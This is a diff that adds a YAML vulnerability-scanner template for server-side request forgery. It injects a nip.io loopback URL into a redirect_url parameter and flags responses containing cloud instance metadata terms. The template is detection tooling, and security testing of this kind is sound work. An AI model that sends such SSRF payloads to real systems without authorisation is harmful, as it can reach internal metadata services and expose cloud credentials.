@@ -1,0 +1,22 @@
+id: patt-ssrf-nipio-01-redirect_url
+name: 'PATT ssrf patt-ssrf-nipio-01 via redirect_url'
+severity: high
+type: active
+tags:
+  - ssrf
+  - patt
+  - protonipio
+description: 'PATT Bypass with Domain Redirect (nip.io). [patt:patt-ssrf-nipio-01] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Server%20Side%20Request%20Forgery/README.md]'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      redirect_url:
+        - 'http://127.0.0.1.nip.io/'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ami-id'
+          - 'instance-id'
+          - 'metadata'
